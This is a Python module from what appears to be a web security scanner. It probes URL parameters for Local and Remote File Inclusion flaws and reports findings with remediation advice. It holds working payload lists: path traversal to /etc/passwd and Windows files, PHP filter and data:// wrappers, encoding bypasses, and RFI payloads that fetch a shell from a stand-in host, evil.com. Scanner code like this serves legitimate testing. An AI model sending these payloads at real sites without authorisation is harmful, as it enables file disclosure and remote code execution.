"""
LFI/RFI Testing Module
Tests for Local File Inclusion and Remote File Inclusion vulnerabilities
"""
import re
from .base import BaseModule


LFI_PAYLOADS = [
    # Basic
    '../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    # Null byte (old PHP)
    '../../../etc/passwd%00',
    '../../../etc/passwd\x00',
    # URL encoded
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252F..%252F..%252Fetc%252Fpasswd',
    # Windows targets
    '../../../windows/win.ini',
    '..\\..\\..\\windows\\win.ini',
    '../../../boot.ini',
    # PHP wrappers
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/read=convert.base64-encode/resource=config.php',
    'php://input',
    'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
    # Double encoding
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    # Path traversal with bypass
    '....//....//....//etc/passwd',
    '..././..././..././etc/passwd',
]

LFI_INDICATORS = [
    r'root:x:0:0',               # /etc/passwd
    r'daemon:x:',                # /etc/passwd
    r'\[boot loader\]',          # boot.ini
    r'\[extensions\]',           # win.ini
    r'for 16-bit app support',   # win.ini
    r'<\?php',                   # PHP source
    r'DB_PASSWORD',              # .env files
    r'mysql_connect',            # PHP config
    r'DOCUMENT_ROOT',            # PHP info
    r'\$_SERVER',                # PHP info
]

RFI_PAYLOADS = [
    'http://evil.com/shell.txt',
    'http://evil.com/shell.txt?',
    'http://127.0.0.1/shell.txt',
    'https://evil.com/shell.php',
    'ftp://evil.com/shell.txt',
    '\\\\evil.com\\share\\shell.txt',
]

# Parameters likely to be vulnerable to LFI/RFI
FILE_PARAMS = [
    'file', 'page', 'include', 'path', 'template', 'view',
    'module', 'doc', 'document', 'folder', 'root', 'dir',
    'url', 'remote', 'require', 'source', 'lang', 'language',
    'read', 'load', 'layout', 'theme', 'conf', 'config', 'content',
]


class LFIModule(BaseModule):
    """Local File Inclusion / Remote File Inclusion testing module."""

    def run(self) -> dict:
        endpoints = self.context.get('endpoints')
        if endpoints is None:
            from .crawler import CrawlerModule
            crawler = CrawlerModule(self.config)
            crawl_data = crawler.run()
            endpoints = crawl_data.get('endpoints', [self.url])

        tested = 0
        for ep in [self.url] + endpoints[:20]:
            if self._test_endpoint(ep):
                tested += 1

        return self.result({'endpoints_tested': tested})

    def _test_endpoint(self, url):
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return False

        found = False
        for param in params:
            is_file_param = any(p in param.lower() for p in FILE_PARAMS)
            
            for payload in LFI_PAYLOADS:
                test_params = dict(params)
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))

                resp = self.get(test_url)
                if resp and self._check_lfi(resp.text):
                    self.add_finding(
                        f'Local File Inclusion: {param}',
                        'CRITICAL',
                        f'LFI vulnerability in parameter "{param}"',
                        f'Payload: {payload}\nURL: {test_url[:200]}',
                        'Never pass user-controlled values to file inclusion functions. Use whitelisting.'
                    )
                    found = True
                    break

            # RFI test (only on likely file params to reduce noise)
            if is_file_param:
                self._test_rfi(url, parsed, param, params)

        return found

    def _test_rfi(self, url, parsed, param, params):
        from urllib.parse import urlencode, urlunparse
        for payload in RFI_PAYLOADS[:3]:
            test_params = dict(params)
            test_params[param] = [payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))

            resp = self.get(test_url)
            if resp and resp.status_code == 200:
                # If error suggests RFI attempt was processed
                rfi_indicators = [
                    'failed to open stream', 'include_path',
                    'allow_url_include', 'allow_url_fopen',
                ]
                if any(ind in (resp.text or '').lower() for ind in rfi_indicators):
                    self.add_finding(
                        f'Potential RFI: {param}',
                        'CRITICAL',
                        f'Remote File Inclusion indicators detected for param "{param}"',
                        f'Payload: {payload}',
                        'Disable allow_url_include in PHP. Never include remote files.'
                    )

    def _check_lfi(self, body):
        if not body:
            return False
        for indicator in LFI_INDICATORS:
            if re.search(indicator, body, re.IGNORECASE):
                return True
        return False
